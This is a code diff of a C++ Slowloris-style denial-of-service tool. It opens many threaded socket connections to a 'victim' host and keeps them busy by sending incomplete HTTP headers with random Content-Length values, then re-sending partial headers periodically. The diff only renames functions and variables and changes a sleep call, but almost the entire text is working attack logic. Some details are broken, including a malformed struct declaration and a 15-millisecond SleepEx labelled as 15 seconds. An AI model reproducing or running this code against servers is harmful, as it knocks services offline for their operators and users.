@@ -34,14 +34,13 @@ struct sockaddr_in
 	string sin_port; //htons(victimPORT);
 }; sockaddr_in
 
-void initialSendSocket(int socketNum) {
+void initialSendSockets(int socketNum) {
 	const int HEADER_INT = 255;
-
 	const int CONTENT_LENGTH_PLUS = 1000;
-	
-	char incompleteHeader[HEADER_INT];
-	//+ post
 
+	char incompleteHeader[HEADER_INT];
+
+	//+ post
 	sprintf(incompleteHeader, "GET /%d HTTP/1.1\r\n", (rand() % RAND_INT));
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), FLAG_ZERO);
 	sprintf(incompleteHeader, "Host: \r\n");
@@ -51,6 +50,8 @@ void initialSendSocket(int socketNum) {
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), FLAG_ZERO);
 	sprintf(incompleteHeader, "Content-Length: %d\r\n", (rand() % RAND_INT + CONTENT_LENGTH_PLUS));
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), FLAG_ZERO);
+
+	return;
 }
 
 void spamPartialHeaders(struct sockaddr_in victim, vector<int> socketList, int totalSockets) {
@@ -67,7 +68,7 @@ void spamPartialHeaders(struct sockaddr_in victim, vector<int> socketList, int t
 			socketList.erase(socketList.begin() + i);
 			socketList.push_back(socket(AF_INET, SOCK_STREAM, FLAG_ZERO));
 			connect(socketList.at(totalSockets - 1), (struct sockaddr*)&victim, sizeof(victim));
-			initialSendSocket(socketList.at(i));
+			initialSendSockets(socketList.at(i));
 		}
 	}
 }
@@ -99,12 +100,12 @@ int main(int argc, char* argv[]) {
 	//inet_pton(AF_INET, victimIP, &victim.sin_addr);
 
 	for (int i = 0; i < NUM_THREADS; i++) {
-		const int NONE_EXIST =  1;
+		const int NONE_EXIST_THREAD =  1;
 		vector<int> currentSocketList;
 		int numSockets = ((i == (NUM_THREADS - 1)) ? (socketDensity + totalSockets % NUM_THREADS) : socketDensity);
 		for (int j = 0; j < numSockets; j++) {
 			currentSocketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
-			if (currentSocketList.at(j) < NONE_EXIST) {
+			if (currentSocketList.at(j) < NONE_EXIST_THREAD) {
 				cout << "Could not create socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
 				return(0);
 			}
@@ -116,7 +117,7 @@ int main(int argc, char* argv[]) {
 				return(0);
 			}
 			cout << "Successfully connected socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
-			initialSendSocket(currentSocketList.at(j));
+			initialSendSockets(currentSocketList.at(j));
 			cout << "Successfully sent incomplete header for socket " << j + 1 << " on thread #" << i + 1 << "." << endl;
 		}
 
@@ -143,7 +144,7 @@ int main(int argc, char* argv[]) {
 		cout << "Iteration " << iterations << " completed." << endl;
 		iterations++;
 		cout << "Sleeping for 15 seconds... " << endl;
-		//sleep(15); windows
+		SleepEx(15, true); // windows
 		cout << "------------" << endl;
 	}
 
